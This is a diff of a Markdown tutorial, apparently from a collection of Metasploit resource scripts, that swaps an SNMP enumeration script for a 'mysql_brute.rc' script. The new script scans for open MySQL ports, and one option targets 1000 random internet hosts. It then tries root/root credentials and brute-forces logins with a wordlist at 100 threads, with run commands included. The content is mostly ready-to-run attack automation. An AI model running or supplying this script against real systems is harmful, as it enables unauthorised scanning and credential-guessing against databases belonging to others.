@@ -456,58 +456,106 @@ Open your text editor and copy/past the follow ruby (erb) code to it, save file 
       run_single("unset THREADS VERBOSE BRUTEFORCE_SPEED USERPASS_FILE STOP_ON_SUCCESS")
      run_single("services -d")
      run_single("hosts -d")
+     run_single("exit -y")
    </ruby>
 ```
 **[in terminal]::Run the script::** `msfconsole -r /root/brute_force.rc`
 
 <br /><br />
 
-<blockquote>Run auxiliary snmp modules and nmap nse scripts againts sellected setg RHOSTS variable defined in msfconsole. Users just need to manually input target(s) ip address(s) into 'SETG' RHOSTS var to point to the targets to be scanned.</blockquote>
+<blockquote>mysql_brute will use nmap to search/check for port 3306 open, then it populates the msfdb with a list of hosts found, and run auxiliary modules to gather info and brute force mysql services. if none value (setg) has povided then this resource script will use is own default values.</blockquote>
 
-Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **snmp_enum.rc**
+Open your text editor and copy/past the follow ruby (erb) code to it, save file and name it as: **mysql_brute.rc**
 ```
    <ruby>
       help = %Q|
         Description:
-          This Metasploit RC file can be used to automate the exploitation process.
-          In this example we are using msfconsole setg to add to msfdb database rhost(s)
-          then trigger db_nmap nse scripts and msfconsole auxiliary modules againts rhost(s).
+          setg RANDOM_HOSTS true - To instruct db_nmap to random search for hosts with port 3306 open
+          setg RHOSTS 192.168.1.71 192.168.1.254 - To instruct db_nmap to check targets for port 3306 open
+          setg USERPASS_FILE /root/my_dicionary.txt - To instruct auxiliarys to use our own dicionary file
+          mysql_brute will use nmap to search/check for port 3306 open, then it populates the msfdb with
+          a list of hosts found, and run auxiliary modules to gather info and brute force mysql services.
+          if none value (setg) has povided then this resource script will use is own default values.
 
         Execute in msfconsole:
+          setg RANDOM_HOSTS <true-or-blank>
           setg RHOSTS <hosts-separated-by-spaces>
-          resource <path-to-script>/snmp_enum.rc
+          setg USERPASS_FILE <absoluct-path-to-dicionary.txt>
+          resource <path-to-script>/mysql_brute.rc
 
         Author:
           r00t-3xp10it  <pedroubuntu10[at]gmail.com>
       |
       print_line(help)
-      Rex::sleep(1.5)
+      Rex::sleep(2.0)
 
-      print_status("Please wait, checking if RHOSTS are set globally.")
-      if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
-         print_error("Please set RHOSTS: setg RHOSTS xxx.xxx.xxx.xxx xxx.xxx.xxx.xxx")
-         return nil
+
+      if (framework.datastore['USERPASS_FILE'] == nil or framework.datastore['USERPASS_FILE'] == '')
+         run_single("setg USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/piata_ssh_userpass.txt")
+      end
+      if (framework.datastore['RANDOM_HOSTS'] == nil or framework.datastore['RANDOM_HOSTS'] == '')
+         if (framework.datastore['RHOSTS'] == nil or framework.datastore['RHOSTS'] == '')
+            run_single("setg RHOSTS 192.168.1.0/24")
+            run_single("db_nmap -sV -Pn -T4 -O -p 3306 --script=mysql-info.nse,mysql-databases.nse,mysql-audit.nse,ip-geolocation-geoplugin.nse --open #{framework.datastore['RHOSTS']}")
+         end
+      else
+         print_warning("db_nmap: search for random targets with port: 3306 open (mysql)")
+         run_single("db_nmap -T4 -iR 1000 -Pn -p 3306 --open")
       end
 
-         print_good("RHOSTS set globally [ OK ] running nmap scans.")
-         run_single("db_nmap -sU -sS -Pn --script=banner.nse,smb-os-discovery.nse,smb-enum-shares.nse,smb-enum-processes.nse --script-args=unsafe=1 -p U:137,T:139,445 #{framework.datastore['RHOSTS']}")
-         run_single("hosts")
-         run_single("services")
+      run_single("services")
+      print_good("Reading msfdb database for info.")
+      xhost = framework.db.hosts.map(&:address).join(' ')
+      xport = framework.db.services.map(&:port).join(' ')
 
-      print_good("Please wait, running msf auxiliary modules.")
-      run_single("use auxiliary/scanner/snmp/snmp_enum")
-      run_single("exploit")
-      run_single("use auxiliary/scanner/snmp/snmp_enumusers")
-      run_single("exploit")
-      run_single("use auxiliary/scanner/snmp/snmp_enumshares")
-      run_single("exploit")
-      print_warning("please wait, Cleaning msfdb Database.")
-      run_single("unsetg RHOSTS")
-     run_single("services -d")
-     run_single("hosts -d")
-   </ruby>
+         if xhost.nil? or xhost == ''
+              print_error("db_nmap scan did not find any alive connections.")
+              print_error("please wait, cleaning recent configurations.")
+              run_single("unsetg RHOSTS USERPASS_FILE RANDOM_HOSTS")
+              return nil
+         elsif xport.nil? or xport == ''
+              print_error("db_nmap did not find any 3306 open ports.")
+              print_error("please wait, cleaning recent configurations.")
+              run_single("unsetg RHOSTS USERPASS_FILE RANDOM_HOSTS")
+              run_single("services -d")
+              run_single("hosts -d")
+              return nil
+         end
+
+         run_single("setg RHOSTS #{xhost}")
+         if xport =~ /3306/i
+              print_warning("Remote Target port: 3306 mysql found")
+              run_single("use auxiliary/scanner/mysql/mysql_version")
+              run_single("set THREADS 20")
+              run_single("exploit")
+              Rex::sleep(1.5)
+              run_single("use auxiliary/admin/mysql/mysql_enum")
+              run_single("set USERNAME root")
+              run_single("set PASSWORD root")
+              run_single("set THREADS 20")
+              run_single("exploit")
+              Rex::sleep(1.5)
+              run_single("use auxiliary/scanner/mysql/mysql_login")
+              run_single("set USERPASS_FILE #{framework.datastore['USERPASS_FILE']}")
+              run_single("set STOP_ON_SUCCESS true")
+              run_single("set BLANK_PASSWORDS true")
+              run_single("set VERBOSE true")
+              run_single("set THREADS 100")
+              run_single("exploit")
+              Rex::sleep(1.5)
+       end
+
+       print_warning("please wait, Cleaning msfdb Database.")
+       Rex::sleep(1.0)
+       run_single("unsetg RHOSTS USERPASS_FILE")
+       run_single("unset THREADS VERBOSE USERNAME USERPASS_FILE PASSWORD STOP_ON_SUCCESS")
+       Rex::sleep(1.0)
+       run_single("services -d")
+       run_single("hosts -d")
+       run_single("exit -y")
+</ruby>
 ```
-**[in terminal]::Run the script::** `msfconsole -r /root/snmp_enum.rc`
+**[in terminal]::Run the script::** `msfconsole -q -x 'setg RANDOM_HOSTS true; resource /root/mysql_brute.rc'`
 
 <br />
 
